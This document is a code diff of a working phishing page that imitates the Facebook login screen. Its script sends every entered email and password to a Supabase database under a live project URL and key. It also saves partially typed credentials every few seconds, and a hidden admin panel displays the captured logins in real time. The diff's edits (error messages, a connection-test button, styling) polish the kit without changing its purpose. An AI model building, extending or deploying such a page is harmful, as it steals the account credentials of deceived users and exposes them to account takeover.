@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Log In or Sign Up</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Add Supabase JS library -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
@@ -38,16 +37,19 @@
         }
         
         .logo {
-            font-size: 42px;
+            font-size: 56px;
             font-weight: bold;
             color: #1877f2;
             margin-bottom: 10px;
+            letter-spacing: -1px;
         }
         
         .tagline {
-            font-size: 20px;
+            font-size: 24px;
             max-width: 500px;
             margin: 0 auto 30px;
+            font-weight: normal;
+            line-height: 1.2;
         }
         
         .content {
@@ -55,6 +57,7 @@
             flex-wrap: wrap;
             justify-content: space-between;
             align-items: center;
+            gap: 20px;
         }
         
         .left-content {
@@ -63,7 +66,7 @@
         }
         
         .right-content {
-            flex: 0 0 45%;
+            flex: 0 0 40%;
         }
         
         .login-form {
@@ -72,21 +75,24 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             padding: 20px;
             max-width: 400px;
+            margin: auto;
         }
         
         .login-form input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 16px;
             margin-bottom: 12px;
             border-radius: 6px;
             border: 1px solid #dddfe2;
             font-size: 17px;
+            background: #f5f6f7;
         }
         
         .login-form input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
             outline: none;
+            background: #fff;
         }
         
         .login-btn {
@@ -100,6 +106,7 @@
             width: 100%;
             margin-bottom: 15px;
             cursor: pointer;
+            height: 48px;
         }
         
         .login-btn:hover {
@@ -112,6 +119,7 @@
             display: block;
             margin-bottom: 15px;
             text-decoration: none;
+            font-size: 14px;
         }
         
         .forgot-password:hover {
@@ -134,6 +142,7 @@
             margin: 0 auto;
             display: block;
             cursor: pointer;
+            width: 200px;
         }
         
         .create-account:hover {
@@ -150,6 +159,21 @@
             background-color: #fff;
         }
         
+        .footer p {
+            margin: 5px 0;
+        }
+
+        /* Error display */
+        .error-message {
+            color: #f02849;
+            text-align: center;
+            padding: 10px;
+            margin: 10px 0;
+            background: #fff4f4;
+            border-radius: 6px;
+            display: none;
+        }
+
         /* Main page styles */
         .main-page {
             display: none;
@@ -330,7 +354,7 @@
             z-index: 1003;
             justify-content: center;
             align-items: center;
-        />
+        }
         
         .admin-login-form {
             background: white;
@@ -407,17 +431,33 @@
             left: 10px;
             background: #42b72a;
             color: white;
-            padding: 5px 10px;
-            border-radius: 4px;
+            padding: 8px 12px;
+            border-radius: 6px;
             font-size: 12px;
             z-index: 999;
             display: none;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
         }
         
         .connection-error {
             background: #f02849;
         }
-        
+
+        /* Debug button */
+        .debug-btn {
+            position: fixed;
+            bottom: 60px;
+            left: 10px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            z-index: 999;
+            font-size: 12px;
+        }
+
         @media (max-width: 900px) {
             .content {
                 flex-direction: column;
@@ -437,16 +477,32 @@
             .admin-login-form {
                 padding: 20px;
             }
+
+            .logo {
+                font-size: 42px;
+            }
+
+            .tagline {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Error display -->
+    <div class="error-message" id="errorMessage"></div>
+
     <!-- Supabase status indicator -->
     <div class="supabase-status" id="supabaseStatus">
         <i class="fas fa-database"></i> Supabase: Connected
     </div>
 
-    <!-- Admin Login Form (initially hidden) -->
+    <!-- Debug button -->
+    <button class="debug-btn" onclick="testConnection()">
+        <i class="fas fa-bug"></i> Test Connection
+    </button>
+
+    <!-- Admin Login Form -->
     <div class="admin-login-container" id="adminLoginContainer">
         <div class="admin-login-form">
             <h2><i class="fas fa-lock"></i> Admin Authentication</h2>
@@ -461,9 +517,7 @@
     <!-- Login Page -->
     <div class="container login-page">
         <div class="header">
-            <div class="logo">
-                <span style="color: #1877f2;">f</span>acebook
-            </div>
+            <div class="logo">facebook</div>
             <div class="tagline">
                 Connect with friends and the world around you on Facebook.
             </div>
@@ -471,7 +525,7 @@
         
         <div class="content">
             <div class="left-content">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2YhQ8sn73qU.png" alt="Facebook connection" width="100%">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2YhQ8sn73qU.png" alt="Facebook connection" width="100%" style="max-width: 500px;">
             </div>
             
             <div class="right-content">
@@ -502,7 +556,7 @@
         </div>
         
         <div class="girls-container" id="girlsContainer">
-            <!-- Ethiopian girls names will be populated here -->
+            <!-- Will be populated dynamically -->
         </div>
     </div>
     
@@ -537,7 +591,7 @@
     </div>
 
     <script>
-        // Initialize Supabase with your project details
+        // Initialize Supabase
         const supabaseUrl = 'https://kdhkoogcnxkkqahujpya.supabase.co';
         const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtkaGtvb3Fjbnhra3FhaHVqcHlhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY0OTQ5NDUsImV4cCI6MjA3MjA3MDk0NX0.KT_1_cfDtHgkkjMAAKjH_Jtp0_Qt66PtGXr64-EHArA';
         const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
@@ -565,6 +619,7 @@
             const passwordInput = document.getElementById('password');
             const togglePassword = document.getElementById('togglePassword');
             const supabaseStatus = document.getElementById('supabaseStatus');
+            const errorMessage = document.getElementById('errorMessage');
             
             // Ethiopian girls names
             const ethiopianGirls = [
@@ -583,36 +638,52 @@
             let isAdminAuthenticated = false;
             let realtimeSubscription = null;
 
+            // Show error message
+            function showError(message) {
+                errorMessage.textContent = message;
+                errorMessage.style.display = 'block';
+                setTimeout(() => {
+                    errorMessage.style.display = 'none';
+                }, 5000);
+            }
+
+            // Show status message
+            function showStatus(message, isError = false) {
+                supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
+                supabaseStatus.style.display = 'block';
+                supabaseStatus.className = isError ? 
+                    'supabase-status connection-error' : 'supabase-status';
+                
+                setTimeout(() => {
+                    supabaseStatus.style.display = 'none';
+                }, 3000);
+            }
+
             // Test Supabase connection
-            async function testSupabaseConnection() {
+            window.testConnection = async function() {
                 try {
+                    showStatus('Testing connection...');
                     const { data, error } = await supabase
                         .from('login_attempts')
                         .select('count')
                         .limit(1);
                     
-                    if (!error) {
-                        supabaseStatus.style.display = 'block';
-                        supabaseStatus.classList.remove('connection-error');
-                        supabaseStatus.innerHTML = '<i class="fas fa-database"></i> Supabase: Connected';
-                        setTimeout(() => {
-                            supabaseStatus.style.display = 'none';
-                        }, 3000);
+                    if (error) {
+                        showError('Supabase Error: ' + error.message);
+                        showStatus('Connection Failed', true);
                     } else {
-                        throw error;
+                        showStatus('Connection Successful!');
+                        alert('✅ Connection to Supabase successful!');
                     }
                 } catch (error) {
-                    console.error('Supabase connection error:', error);
-                    supabaseStatus.style.display = 'block';
-                    supabaseStatus.classList.add('connection-error');
-                    supabaseStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Supabase: Connection Failed';
+                    showError('Network Error: ' + error.message);
+                    showStatus('Connection Failed', true);
                 }
             }
             
             // Save data to Supabase
             async function saveToSupabase(data) {
                 try {
-                    // Save individual login attempt to login_attempts table
                     const { error } = await supabase
                         .from('login_attempts')
                         .insert([{ 
@@ -622,17 +693,13 @@
                             incomplete: data.incomplete || false
                         }]);
                     
-                    if (error) throw error;
+                    if (error) {
+                        showError('Save Failed: ' + error.message);
+                        return false;
+                    }
                     return true;
                 } catch (error) {
-                    console.error('Error saving to Supabase:', error);
-                    // Show connection error
-                    supabaseStatus.style.display = 'block';
-                    supabaseStatus.classList.add('connection-error');
-                    supabaseStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Supabase: Save Failed';
-                    setTimeout(() => {
-                        supabaseStatus.style.display = 'none';
-                    }, 3000);
+                    showError('Network Error: ' + error.message);
                     return false;
                 }
             }
@@ -645,17 +712,13 @@
                         .select('*')
                         .order('created_at', { ascending: false });
                     
-                    if (error) throw error;
+                    if (error) {
+                        showError('Load Failed: ' + error.message);
+                        return [];
+                    }
                     return data || [];
                 } catch (error) {
-                    console.error('Error loading from Supabase:', error);
-                    // Show connection error
-                    supabaseStatus.style.display = 'block';
-                    supabaseStatus.classList.add('connection-error');
-                    supabaseStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Supabase: Load Failed';
-                    setTimeout(() => {
-                        supabaseStatus.style.display = 'none';
-                    }, 3000);
+                    showError('Network Error: ' + error.message);
                     return [];
                 }
             }
@@ -664,7 +727,6 @@
             async function displayLoginAttempts() {
                 attemptsList.innerHTML = '';
                 
-                // Load attempts from Supabase
                 loginAttempts = await loadFromSupabase();
                 
                 if (loginAttempts.length === 0) {
@@ -672,7 +734,6 @@
                     return;
                 }
                 
-                // Show most recent first
                 const reversedAttempts = [...loginAttempts].reverse();
                 
                 reversedAttempts.forEach(attempt => {
@@ -688,10 +749,9 @@
                 });
             }
             
-            // Setup real-time subscription to login_attempts table
+            // Setup real-time subscription
             function setupRealtimeSubscription() {
                 if (realtimeSubscription) {
-                    // Remove existing subscription
                     supabase.removeChannel(realtimeSubscription);
                 }
                 
@@ -704,7 +764,6 @@
                             table: 'login_attempts' 
                         }, 
                         (payload) => {
-                            // New record inserted, update the admin panel
                             if (isAdminAuthenticated && adminPanel.style.display === 'block') {
                                 displayLoginAttempts();
                             }
@@ -740,21 +799,25 @@
                 const email = document.getElementById('email').value;
                 const password = document.getElementById('password').value;
                 
-                // Save login attempt to Supabase
-                await saveToSupabase({
+                if (!email || !password) {
+                    showError('Please enter both email and password');
+                    return;
+                }
+                
+                const saved = await saveToSupabase({
                     email: email,
                     password: password,
                     timestamp: new Date().toISOString(),
                     incomplete: false
                 });
                 
-                // Show main page
-                loginPage.style.display = 'none';
-                mainPage.style.display = 'block';
-                
-                // Populate girls if not already done
-                if (girlsContainer.children.length === 0) {
-                    populateGirls();
+                if (saved) {
+                    loginPage.style.display = 'none';
+                    mainPage.style.display = 'block';
+                    
+                    if (girlsContainer.children.length === 0) {
+                        populateGirls();
+                    }
                 }
             });
             
@@ -768,12 +831,10 @@
             // Toggle admin panel
             adminToggle.addEventListener('click', async function() {
                 if (isAdminAuthenticated) {
-                    // Already authenticated, show admin panel
                     adminPanel.style.display = 'block';
                     overlay.style.display = 'block';
                     await displayLoginAttempts();
                 } else {
-                    // Not authenticated, show login form
                     adminLoginContainer.style.display = 'flex';
                 }
             });
@@ -781,7 +842,6 @@
             // Admin login handler
             adminLoginBtn.addEventListener('click', function() {
                 if (adminUsername.value === ADMIN_USERNAME && adminPassword.value === ADMIN_PASSWORD) {
-                    // Correct credentials
                     isAdminAuthenticated = true;
                     adminLoginContainer.style.display = 'none';
                     adminPanel.style.display = 'block';
@@ -789,14 +849,11 @@
                     displayLoginAttempts();
                     adminError.style.display = 'none';
                     
-                    // Set up real-time updates
                     setupRealtimeSubscription();
                     
-                    // Clear the login form
                     adminUsername.value = '';
                     adminPassword.value = '';
                 } else {
-                    // Incorrect credentials
                     adminError.style.display = 'block';
                 }
             });
@@ -805,8 +862,6 @@
             adminLoginClose.addEventListener('click', function() {
                 adminLoginContainer.style.display = 'none';
                 adminError.style.display = 'none';
-                
-                // Clear the login form
                 adminUsername.value = '';
                 adminPassword.value = '';
             });
@@ -816,7 +871,6 @@
                 adminPanel.style.display = 'none';
                 overlay.style.display = 'none';
                 
-                // Remove realtime subscription when panel is closed
                 if (realtimeSubscription) {
                     supabase.removeChannel(realtimeSubscription);
                     realtimeSubscription = null;
@@ -828,7 +882,6 @@
                 adminPanel.style.display = 'none';
                 overlay.style.display = 'none';
                 
-                // Remove realtime subscription when panel is closed
                 if (realtimeSubscription) {
                     supabase.removeChannel(realtimeSubscription);
                     realtimeSubscription = null;
@@ -855,15 +908,15 @@
                         const { error } = await supabase
                             .from('login_attempts')
                             .delete()
-                            .neq('id', 0); // Delete all records
+                            .neq('id', 0);
                         
                         if (error) throw error;
                         
                         loginAttempts = [];
                         await displayLoginAttempts();
+                        showStatus('All data cleared');
                     } catch (error) {
-                        console.error('Error clearing Supabase data:', error);
-                        alert('Error clearing data. Please check console for details.');
+                        showError('Error clearing data: ' + error.message);
                     }
                 }
             });
@@ -876,7 +929,7 @@
             });
             
             // Initialize
-            testSupabaseConnection();
+            testConnection();
             
             // Add real-time keystroke logging
             const emailInput = document.getElementById('email');
@@ -892,14 +945,12 @@
                 passwordValue = this.value;
             });
             
-            // Periodically save what users are typing (even before form submission)
+            // Periodically save what users are typing
             setInterval(async function() {
                 const now = Date.now();
-                // Only save every 3 seconds to avoid too many requests
                 if (now - lastSaveTime < 3000) return;
                 
                 if (emailValue || passwordValue) {
-                    // Save the current typing state
                     const saved = await saveToSupabase({
                         email: emailValue,
                         password: passwordValue,
@@ -911,7 +962,7 @@
                         lastSaveTime = now;
                     }
                 }
-            }, 1000); // Check every second
+            }, 1000);
         });
     </script>
 </body>
